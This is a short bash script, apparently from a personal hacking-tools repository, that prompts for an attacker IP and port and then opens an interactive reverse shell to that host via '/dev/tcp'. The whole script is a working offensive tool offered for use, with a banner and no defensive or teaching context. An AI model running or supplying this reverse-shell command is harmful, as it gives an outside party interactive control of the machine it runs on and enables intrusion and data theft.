#!/bin/bash
#
#this script written for boost speed hacking [BashReverseShell]. 

echo
echo '
###########################################
#-------------) Author: N01 (-------------#
  #========== GitHub: S3C-N01 ==========#
###########################################
'
sleep 0.3
echo
read -p "Enter Attacker-IP: " attip
read -p "Enter Port: " PortSet
echo
bash -i >& /dev/tcp/$attip/$PortSet 0>&1
